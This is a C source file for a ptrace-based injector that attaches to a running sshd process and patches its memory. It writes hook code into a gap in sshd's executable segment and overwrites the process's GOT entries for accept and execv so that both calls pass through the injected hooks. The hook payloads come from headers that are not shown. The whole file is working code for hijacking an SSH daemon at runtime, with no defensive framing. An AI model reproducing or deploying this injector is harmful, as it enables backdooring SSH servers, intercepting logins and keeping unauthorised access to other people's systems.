#include "assemble.h"
#include "got_offset.h"
#include "log.h"
#include "proc_map.h"
#include "seg_gap.h"
#include "sshd_accept_hook.h"
#include "sshd_execv_hook.h"
#include "trace_utils.h"
// clang-format off
#include <iso646.h>
#include <keystone/keystone.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
// clang-format on

#define PADDING 0x10
#define SSHD_PATH "/usr/sbin/sshd"
#define SESSION_PATH "/usr/lib/ssh/sshd-session"

#define ACCEPT_HOOK_OFFSET 0x0
#define EXECV_HOOK_OFFSET 0x256

#define MOV_RAX_CALL "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
#define MOV_RAX "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"

// replace the place_holder to the bytes I need
void
preprocess_code (uint32_t pid, uint64_t sshd_base)
{
  char *mov_rax_call = MOV_RAX_CALL;

  uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
  uint64_t execv;
  copy_from_tracee (pid, execv_got, (char *)&execv, 8);

  mov_rax_call = memmem (sshd_execv, sizeof (sshd_execv), mov_rax_call, 0xc);
  memcpy (&mov_rax_call[2], &execv, 8);

  char *mov_rax = MOV_RAX;
  uint64_t sshd_rw_start = sshd_base + get_seg_gap (SSHD_PATH, 6);

  mov_rax = memmem (sshd_accept, sizeof (sshd_accept), mov_rax, 0xa);
  memcpy (&mov_rax[2], &sshd_rw_start, 0x8);

  mov_rax = MOV_RAX;
  mov_rax = memmem (sshd_execv, sizeof (sshd_execv), mov_rax, 0xa);
  memcpy (&mov_rax[2], &sshd_rw_start, 0x8);
}

int
main (int argc, char **argv)
{
  if (argc != 2)
    PEXIT ("usage: injector pid");
  uint32_t pid = strtol (argv[1], NULL, 0);

  attach (pid);
  // ptrace (PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
  uint64_t sshd_base = parse_maps (pid, "r--p");
  preprocess_code (pid, sshd_base);

  uint64_t accept_got = sshd_base + get_got_offset (SSHD_PATH, "accept");
  uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");

  uint64_t sshd_rx_start = sshd_base + get_seg_gap (SSHD_PATH, 5);
  uint64_t sshd_rx_gap = sshd_rx_start % 0x1000;
  printf ("sshd_rx_gap: 0x%lx\n", (0x1000 - sshd_rx_gap));
  printf ("while we need 0x%lx\n",
          (sizeof (sshd_accept) + sizeof (sshd_execv)));

  uint64_t accept_hook_start = sshd_rx_start;
  copy_to_tracee (pid, accept_hook_start, sshd_accept, sizeof (sshd_accept));
  accept_hook_start += ACCEPT_HOOK_OFFSET;
  copy_to_tracee (pid, accept_got, (uint8_t *)&accept_hook_start, 0x8);

  uint64_t execv_hook_start
      = ((sshd_rx_start + sizeof (sshd_accept)) & ~0x7) + 0x8;
  copy_to_tracee (pid, execv_hook_start, sshd_execv, sizeof (sshd_execv));
  execv_hook_start += EXECV_HOOK_OFFSET;
  copy_to_tracee (pid, execv_got, (uint8_t *)&execv_hook_start, 0x8);

  detach (pid);
}
